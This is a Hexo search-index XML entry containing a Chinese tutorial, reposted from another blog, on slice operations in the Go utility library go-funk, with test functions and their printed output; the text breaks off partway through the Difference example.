<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Go工具库go-funk使用</title>
    <link href="/2023/06/05/Go%E5%B7%A5%E5%85%B7%E5%BA%93go-funk%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/06/05/Go%E5%B7%A5%E5%85%B7%E5%BA%93go-funk%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Go工具库go-funk使用"><a href="#Go工具库go-funk使用" class="headerlink" title="Go工具库go-funk使用"></a>Go工具库go-funk使用</h1><blockquote><p>转载自<a href="mailto:undefined">刘庆辉</a>：<a href="http://liuqh.icu/2021/12/25/go/package/32-go-funk/">http://liuqh.icu/2021/12/25/go/package/32-go-funk/</a></p></blockquote><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h2><p><code>Go-funk</code> 是基于反射(<code>reflect </code>)实现的一个现代<code>Go</code>工具库，封装了对<code>slice/map/struct/string</code>等的操作。</p><h2 id="2-下载"><a href="#2-下载" class="headerlink" title="2. 下载"></a>2. 下载</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">Bash<br><span class="hljs-comment"># 下载</span><br>go get github.com<span class="hljs-regexp">/thoas/g</span>o-funk<br><span class="hljs-comment"># 引入</span><br>import github.com<span class="hljs-regexp">/thoas/g</span>o-funk<br></code></pre></td></tr></table></figure><h2 id="3-切片-slice-操作"><a href="#3-切片-slice-操作" class="headerlink" title="3. 切片(slice)操作"></a>3. 切片(<code>slice</code>)操作</h2><h3 id="3-1-判断元素是否存在"><a href="#3-1-判断元素是否存在" class="headerlink" title="3.1 判断元素是否存在"></a>3.1 判断元素是否存在</h3><ul><li><code>funk.Contains</code>: 接收任意类型。</li><li><code>funk.ContainsX</code>: <code>X</code>代表具体类型，如:<code>ContainsInt、ContainsString...</code></li></ul><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestExist</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 判断任意类型</span><br>fmt.Println(<span class="hljs-string">&quot;str-&gt;&quot;</span>, funk.Contains([]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>&#125;, <span class="hljs-string">&quot;a&quot;</span>))<br><span class="hljs-comment">// int 类型</span><br>fmt.Println(<span class="hljs-string">&quot;int-&gt;&quot;</span>, funk.ContainsInt([]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;, <span class="hljs-number">1</span>))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestExist</span><br><span class="hljs-comment">str-&gt; true</span><br><span class="hljs-comment">int-&gt; true</span><br><span class="hljs-comment">--- PASS: TestExist (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-2-查找元素第一次出现位置"><a href="#3-2-查找元素第一次出现位置" class="headerlink" title="3.2 查找元素第一次出现位置"></a>3.2 查找元素第一次出现位置</h3><ul><li><code>funk.IndexOf</code>: 接收任意类型,不存在则返回<code>-1</code>。</li><li><code>funk.IndexOfX</code>: <code>X</code>代表具体类型,不存在则返回<code>-1</code>。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestIndexOf</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>strArr := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>&#125;<br><span class="hljs-comment">// 具体类型</span><br>fmt.Println(<span class="hljs-string">&quot;c: &quot;</span>, funk.IndexOfString(strArr, <span class="hljs-string">&quot;c&quot;</span>))<br><span class="hljs-comment">// 验证第一次出现位置</span><br>fmt.Println(<span class="hljs-string">&quot;java: &quot;</span>, funk.IndexOfString(strArr, <span class="hljs-string">&quot;java&quot;</span>))<br><span class="hljs-comment">// 任意类型</span><br>fmt.Println(<span class="hljs-string">&quot;go: &quot;</span>, funk.IndexOf(strArr, <span class="hljs-string">&quot;go&quot;</span>))<br><span class="hljs-comment">// 不存在时返回-1</span><br>fmt.Println(<span class="hljs-string">&quot;php: &quot;</span>, funk.IndexOfString(strArr, <span class="hljs-string">&quot;php&quot;</span>))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestIndexOf</span><br><span class="hljs-comment">c:  2</span><br><span class="hljs-comment">java:  1</span><br><span class="hljs-comment">go:  0</span><br><span class="hljs-comment">php:  -1</span><br><span class="hljs-comment">--- PASS: TestIndexOf (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-3-查找元素最后一次出现位置"><a href="#3-3-查找元素最后一次出现位置" class="headerlink" title="3.3 查找元素最后一次出现位置"></a>3.3 查找元素最后一次出现位置</h3><ul><li><code>funk.LastIndexOf</code>: 接收任意类型,不存在则返回<code>-1</code>。</li><li><code>funk.LastIndexOfX</code>: <code>X</code>代表具体类型,不存在则返回<code>-1</code>。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 查找元素最后一次出现的位置</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestLastOf</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>strArr := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>&#125;<br><span class="hljs-comment">// 具体类型</span><br>fmt.Println(<span class="hljs-string">&quot;c: &quot;</span>, funk.LastIndexOfString(strArr, <span class="hljs-string">&quot;c&quot;</span>))<br><span class="hljs-comment">// 验证第一次出现位置</span><br>fmt.Println(<span class="hljs-string">&quot;java: &quot;</span>, funk.LastIndexOfString(strArr, <span class="hljs-string">&quot;java&quot;</span>))<br><span class="hljs-comment">// 任意类型</span><br>fmt.Println(<span class="hljs-string">&quot;go: &quot;</span>, funk.LastIndexOf(strArr, <span class="hljs-string">&quot;go&quot;</span>))<br><span class="hljs-comment">// 不存在时返回-1</span><br>fmt.Println(<span class="hljs-string">&quot;php: &quot;</span>, funk.LastIndexOf(strArr, <span class="hljs-string">&quot;php&quot;</span>))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestLastOf</span><br><span class="hljs-comment">c:  2</span><br><span class="hljs-comment">java:  3</span><br><span class="hljs-comment">go:  0</span><br><span class="hljs-comment">php:  -1</span><br><span class="hljs-comment">--- PASS: TestLastOf (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-4-批量查找-都有则True"><a href="#3-4-批量查找-都有则True" class="headerlink" title="3.4 批量查找(都有则True)"></a>3.4 批量查找(都有则True)</h3><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">func <span class="hljs-constructor">Every(<span class="hljs-params">in</span> <span class="hljs-params">interface</span>&#123;&#125;, <span class="hljs-params">elements</span> <span class="hljs-operator">...</span><span class="hljs-params">interface</span>&#123;&#125;)</span> <span class="hljs-built_in">bool</span><br></code></pre></td></tr></table></figure></blockquote><ul><li>当<code>elements</code>都在<code>in</code>中时，则返回<code>true</code>; 否则为<code>false</code>;</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestEvery</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>strArr := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;python&quot;</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;都存在:&quot;</span>, funk.Every(strArr, <span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>))<br>fmt.Println(<span class="hljs-string">&quot;有一个不存在:&quot;</span>, funk.Every(strArr, <span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;go&quot;</span>))<br>fmt.Println(<span class="hljs-string">&quot;都不存在:&quot;</span>, funk.Every(strArr, <span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;c++&quot;</span>))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestEvery</span><br><span class="hljs-comment">都存在: true</span><br><span class="hljs-comment">有一个不存在: false</span><br><span class="hljs-comment">都不存在: false</span><br><span class="hljs-comment">--- PASS: TestEvery (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-5-批量查找-有一则True"><a href="#3-5-批量查找-有一则True" class="headerlink" title="3.5 批量查找(有一则True)"></a>3.5 批量查找(有一则True)</h3><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">func <span class="hljs-constructor">Some(<span class="hljs-params">in</span> <span class="hljs-params">interface</span>&#123;&#125;, <span class="hljs-params">elements</span> <span class="hljs-operator">...</span><span class="hljs-params">interface</span>&#123;&#125;)</span> <span class="hljs-built_in">bool</span><br></code></pre></td></tr></table></figure></blockquote><ul><li>当<code>elements</code>至少有一个在<code>in</code>中时，则返回<code>true</code>; 否则为<code>false</code>;</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 批量查找，有一则返回true</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestSome</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>strArr := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;python&quot;</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;都存在:&quot;</span>, funk.Some(strArr, <span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>))<br>fmt.Println(<span class="hljs-string">&quot;至少一个存在:&quot;</span>, funk.Some(strArr, <span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;go&quot;</span>))<br>fmt.Println(<span class="hljs-string">&quot;都不存在:&quot;</span>, funk.Some(strArr, <span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;c++&quot;</span>))<br>&#125;<br><span class="hljs-comment">/***输出</span><br><span class="hljs-comment">=== RUN   TestSome</span><br><span class="hljs-comment">都存在: true</span><br><span class="hljs-comment">至少一个存在: true</span><br><span class="hljs-comment">都不存在: false</span><br><span class="hljs-comment">--- PASS: TestSome (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-6-获取最后或第一个元素"><a href="#3-6-获取最后或第一个元素" class="headerlink" title="3.6 获取最后或第一个元素"></a>3.6 获取最后或第一个元素</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 获取第一个元素 或 最后一个元素</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestLastOrFirst</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>number := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">12</span>, <span class="hljs-number">23</span>&#125;<br><span class="hljs-comment">// 获取第一个元素</span><br>fmt.Println(<span class="hljs-string">&quot;Head: &quot;</span>, funk.Head(number))<br><span class="hljs-comment">// 获取最后一个元素</span><br>fmt.Println(<span class="hljs-string">&quot;Last: &quot;</span>, funk.Last(number))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestLastOrFirst</span><br><span class="hljs-comment">Head:  10</span><br><span class="hljs-comment">Last:  23</span><br><span class="hljs-comment">--- PASS: TestLastOrFirst (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-7-用元素填充切片"><a href="#3-7-用元素填充切片" class="headerlink" title="3.7 用元素填充切片"></a>3.7 用元素填充切片</h3><blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fill</span><span class="hljs-params">(in <span class="hljs-keyword">interface</span>&#123;&#125;, fillValue <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure></blockquote><ul><li>将<code>in</code>中的所有元素，设置成<code>fillValue</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 填充元素</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestFill</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 初始化切片</span><br><span class="hljs-keyword">var</span> data = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">3</span>)<br>fill, _ := funk.Fill(data, <span class="hljs-number">100</span>)<br>fmt.Printf(<span class="hljs-string">&quot;fill: %v \n&quot;</span>, fill)<br><span class="hljs-comment">// 将所有值设置成2</span><br>input := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>result, _ := funk.Fill(input, <span class="hljs-number">2</span>)<br>fmt.Printf(<span class="hljs-string">&quot;result: %v \n&quot;</span>, result)<br><span class="hljs-keyword">var</span> structData = <span class="hljs-built_in">make</span>([]Student, <span class="hljs-number">2</span>)<br>stuInfo, _ := funk.Fill(structData, Student&#123;Name: <span class="hljs-string">&quot;张三&quot;</span>, Age: <span class="hljs-number">18</span>&#125;)<br>fmt.Printf(<span class="hljs-string">&quot;stuInfo: %v \n&quot;</span>, stuInfo)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestFill</span><br><span class="hljs-comment">fill: [100 100 100] </span><br><span class="hljs-comment">result: [2 2 2] </span><br><span class="hljs-comment">stuInfo: [&#123;张三 18&#125; &#123;张三 18&#125;] </span><br><span class="hljs-comment">--- PASS: TestFill (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-8-取两个切片共同元素结果集"><a href="#3-8-取两个切片共同元素结果集" class="headerlink" title="3.8 取两个切片共同元素结果集"></a>3.8 取两个切片共同元素结果集</h3><ul><li><code>Join(larr, rarr interface&#123;&#125;, fnc JoinFnc)</code>: 当<code>fnc=funk.InnerJoin</code>,代表合并两个任意类型切片。</li><li><code>JoinXXX(larr, rarr interface&#123;&#125;, fnc JoinFnc)</code>: 指定类型合并，推荐使用。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">type</span> cus <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Age  <span class="hljs-type">int</span><br>Home <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestJoin</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>a := []<span class="hljs-type">int64</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>&#125;<br>b := []<span class="hljs-type">int64</span>&#123;<span class="hljs-number">3</span>, <span class="hljs-number">7</span>&#125;<br><span class="hljs-comment">// 任意类型切片交集</span><br>join := funk.Join(a, b, funk.InnerJoin)<br>fmt.Println(<span class="hljs-string">&quot;join = &quot;</span>, join)<br><span class="hljs-comment">// 指定类型取交集</span><br>joinInt64 := funk.JoinInt64(a, b, funk.InnerJoinInt64)<br>fmt.Println(<span class="hljs-string">&quot;joinInt64 = &quot;</span>, joinInt64)<br><span class="hljs-comment">// 自定义结构体交集</span><br>sliceA := []cus&#123;<br>&#123;<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;北京&quot;</span>&#125;,<br>&#123;<span class="hljs-string">&quot;李四&quot;</span>, <span class="hljs-number">22</span>, <span class="hljs-string">&quot;南京&quot;</span>&#125;,<br>&#125;<br>sliceB := []cus&#123;<br>&#123;<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;北京&quot;</span>&#125;,<br>&#123;<span class="hljs-string">&quot;李四&quot;</span>, <span class="hljs-number">22</span>, <span class="hljs-string">&quot;上海&quot;</span>&#125;,<br>&#125;<br>res := funk.Join(sliceA, sliceB, funk.InnerJoin)<br>fmt.Println(<span class="hljs-string">&quot;自定义结构体: &quot;</span>, res)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestJoin</span><br><span class="hljs-comment">join =  [3 7]</span><br><span class="hljs-comment">joinInt64 =  [3 7]</span><br><span class="hljs-comment">自定义结构体:  [&#123;张三 20 北京&#125;]</span><br><span class="hljs-comment">--- PASS: TestJoin (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-9-获取去掉两切片共同元素结果集"><a href="#3-9-获取去掉两切片共同元素结果集" class="headerlink" title="3.9 获取去掉两切片共同元素结果集"></a>3.9 获取去掉两切片共同元素结果集</h3><p>同样使用<code>Join</code>和<code>JoinXXX</code>方法，而<code>fnc</code>设置成<code>funk.OuterJoin</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 取差集</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestDiffSlice</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>a := []<span class="hljs-type">int64</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>&#125;<br>b := []<span class="hljs-type">int64</span>&#123;<span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>&#125;<br><span class="hljs-comment">// 任意类型切片交集</span><br>join := funk.Join(a, b, funk.OuterJoin)<br>fmt.Println(<span class="hljs-string">&quot;OuterJoin = &quot;</span>, join)<br><span class="hljs-comment">// 指定类型取交集</span><br>joinInt64 := funk.JoinInt64(a, b, funk.OuterJoinInt64)<br>fmt.Println(<span class="hljs-string">&quot;joinInt64 = &quot;</span>, joinInt64)<br><span class="hljs-comment">// 自定义结构体交集</span><br>sliceA := []cus&#123;<br>&#123;<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;北京&quot;</span>&#125;,<br>&#123;<span class="hljs-string">&quot;李四&quot;</span>, <span class="hljs-number">22</span>, <span class="hljs-string">&quot;南京&quot;</span>&#125;,<br>&#125;<br>sliceB := []cus&#123;<br>&#123;<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;北京&quot;</span>&#125;,<br>&#123;<span class="hljs-string">&quot;李四&quot;</span>, <span class="hljs-number">22</span>, <span class="hljs-string">&quot;上海&quot;</span>&#125;,<br>&#125;<br>res := funk.Join(sliceA, sliceB, funk.OuterJoin)<br>fmt.Println(<span class="hljs-string">&quot;自定义结构体: &quot;</span>, res)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestDiffSlice</span><br><span class="hljs-comment">OuterJoin =  [1 5 10]</span><br><span class="hljs-comment">joinInt64 =  [1 5 10]</span><br><span class="hljs-comment">自定义结构体:  [&#123;李四 22 南京&#125; &#123;李四 22 上海&#125;]</span><br><span class="hljs-comment">--- PASS: TestDiffSlice (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-10-求只存在某切片的元素-除去共同元素"><a href="#3-10-求只存在某切片的元素-除去共同元素" class="headerlink" title="3.10 求只存在某切片的元素(除去共同元素)"></a>3.10 求只存在某切片的元素(除去共同元素)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestLeftAndRightJoin</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>a := []<span class="hljs-type">int64</span>&#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>&#125;<br>b := []<span class="hljs-type">int64</span>&#123;<span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;<br><span class="hljs-comment">// 取出只在a，不在b的元素</span><br>leftJoin := funk.Join(a, b, funk.LeftJoin)<br>fmt.Println(<span class="hljs-string">&quot;只在a切片的元素: &quot;</span>, leftJoin)<br><span class="hljs-comment">// 取出只在b，不在a的元素</span><br>rightJoin := funk.Join(a, b, funk.RightJoin)<br>fmt.Println(<span class="hljs-string">&quot;只在b切片的元素: &quot;</span>, rightJoin)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestLeftAndRightJoin</span><br><span class="hljs-comment">只在a切片的元素:  [10 20]</span><br><span class="hljs-comment">只在b切片的元素:  [40]</span><br><span class="hljs-comment">--- PASS: TestLeftAndRightJoin (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-11-分别去掉两个切片共同元素-两结果集"><a href="#3-11-分别去掉两个切片共同元素-两结果集" class="headerlink" title="3.11 分别去掉两个切片共同元素(两结果集)"></a>3.11 分别去掉两个切片共同元素(两结果集)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestDifferent</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 处理任意类型</span><br>one := []<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-number">3.2</span>, []<span class="hljs-type">int8</span>&#123;<span class="hljs-number">10</span>&#125;&#125;<br>two := []<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<span class="hljs-number">2</span>, <span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-number">3.2</span>, []<span class="hljs-type">int</span>&#123;<span class="hljs-number">20</span>&#125;&#125;<br>oneRes, twoRes := funk.Difference(one, two)<br>fmt.Println(<span class="hljs-string">&quot;oneRes: &quot;</span>, oneRes)<br>fmt.Println(<span class="hljs-string">&quot;twoRes:  &quot;</span>, twoRes)<br><br><span class="hljs-comment">// 只处理具体类型</span><br>str1 := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>&#125;<br>str2 := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>&#125;<br>res, res1 := funk.DifferenceString(str1, str2)<br>fmt.Println(<span class="hljs-string">&quot;res: &quot;</span>, res)<br>fmt.Println(<span class="hljs-string">&quot;res1: &quot;</span>, res1)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestDifferent</span><br><span class="hljs-comment">oneRes:  [1 [10]]</span><br><span class="hljs-comment">twoRes:   [2 [20]]</span><br><span class="hljs-comment">res:  [go php]</span><br><span class="hljs-comment">res1:  [c python]</span><br><span class="hljs-comment">--- PASS: TestDifferent 